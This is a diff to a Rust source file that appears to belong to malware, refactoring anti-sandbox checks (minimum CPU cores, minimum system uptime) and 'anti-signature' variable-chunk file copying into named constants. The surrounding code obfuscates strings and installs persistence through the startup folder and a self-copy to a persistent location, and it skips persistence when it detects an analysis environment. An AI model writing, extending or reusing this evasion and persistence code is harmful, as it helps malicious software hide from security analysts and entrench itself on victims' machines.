@@ -10,6 +10,16 @@ use std::env;
 use std::path::{Path, PathBuf};
 use obfstr::obfstr;
 
+// Anti-sandbox constants
+#[cfg(target_os = "windows")]
+const MIN_CPU_CORES: usize = 2;
+#[cfg(target_os = "windows")]
+const MIN_UPTIME_MS: u64 = 180_000; // 3 minutes
+
+// File copy anti-signature constants
+const CHUNK_SIZES: [usize; 4] = [12288, 16384, 8192, 24576];
+const MAX_CHUNK_SIZE: usize = 24576;
+
 /// Métodos de persistencia disponibles
 #[derive(Debug, Clone, Copy)]
 pub enum PersistenceMethod {
@@ -116,12 +126,11 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
         .map_err(|e| format!("E2: {}", e))?;
     
     // Tamaños de chunk variables para evitar patrones
-    let chunk_sizes = [12288, 16384, 8192, 24576];
-    let mut buffer = vec![0u8; 24576];
+    let mut buffer = vec![0u8; MAX_CHUNK_SIZE];
     let mut chunk_idx = 0;
     
     loop {
-        let chunk_size = chunk_sizes[chunk_idx % chunk_sizes.len()];
+        let chunk_size = CHUNK_SIZES[chunk_idx % CHUNK_SIZES.len()];
         let n = source.read(&mut buffer[..chunk_size])
             .map_err(|e| format!("E3: {}", e))?;
         if n == 0 { break; }
@@ -412,19 +421,18 @@ fn persist_startup_folder(exe_path: &Path) -> Result<String, String> {
 /// This prevents persistence in analysis environments
 #[cfg(target_os = "windows")]
 fn environment_check() -> bool {
-    // Check 1: Minimum 2 CPU cores (most sandboxes have 1)
+    // Check 1: Minimum CPU cores (most sandboxes have 1)
     let cpus = std::thread::available_parallelism()
         .map(|p| p.get())
         .unwrap_or(1);
-    if cpus < 2 {
+    if cpus < MIN_CPU_CORES {
         return false;
     }
     
     // Check 2: Uptime check - real systems have some uptime
     // Sandboxes are freshly booted
     let uptime_ms = unsafe { winapi::um::sysinfoapi::GetTickCount64() };
-    // Require at least 3 minutes of uptime (180000ms)
-    if uptime_ms < 180_000 {
+    if uptime_ms < MIN_UPTIME_MS {
         return false;
     }
     
